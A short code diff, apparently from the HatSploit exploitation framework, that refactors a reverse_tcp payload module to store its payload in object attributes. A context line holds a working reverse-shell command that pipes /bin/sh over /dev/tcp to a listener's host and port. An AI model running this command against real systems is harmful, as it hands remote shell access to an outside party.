@@ -71,6 +71,6 @@ class HatSploitPayload(HatSploitPayload):
         else:
             payload = f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1 2>/dev/null &"
 
-        self.method['Payload'] = payload
-        self.method['Instructions'] = payload
-        self.method['Type'] = 'reverse_tcp'
+        self.payload = payload
+        self.instructions = payload
+        self.action = 'reverse_tcp'
